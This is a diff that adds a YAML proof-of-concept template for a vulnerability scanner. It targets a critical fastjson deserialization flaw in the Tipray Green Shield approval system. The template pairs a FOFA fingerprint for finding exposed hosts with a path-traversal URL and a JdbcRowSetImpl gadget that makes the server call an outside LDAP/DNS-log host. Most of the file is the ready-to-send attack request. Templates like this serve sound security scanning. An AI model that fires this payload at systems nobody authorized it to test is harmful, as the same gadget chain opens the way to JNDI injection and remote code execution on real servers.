@@ -1,0 +1,37 @@
+id: poc-yaml-tipray-gsas-mergequery-fastjson-deserialization
+info:
+  name: 天锐绿盾审批系统 mergeQuery fastjson 反序列化漏洞
+  severity: critical
+  tags:
+  - 反序列化
+  - DNSLOG
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  random: random_str(6)
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/rest/ext/mergeQuery
+  headers:
+    Content-Type: application/json
+  data: "[\n    {\n        \"requestType\": \"trusteeMsg\",\n        \"requestBody\"\
+    : {\n            \"userId\": {\n                \"@type\": \"com.sun.rowset.JdbcRowSetImpl\"\
+    ,\n                \"dataSourceName\": \"ldap://{{.domain}}/{{.random}}\",\n \
+    \               \"autoCommit\": true\n            },\n            \"createTime\"\
+    : \"2023-01-01\"\n        }\n    }\n]"
+  expression: 'status_code == 400 &&
+
+    contains(content_type,"application/json") &&
+
+    contains(body,"Bad request") &&
+
+    contains(body,"查询委托消息请求体格式错误") &&
+
+    !contains(body,"<") &&
+
+    reverse.Verify()
+
+    '
+transport: http
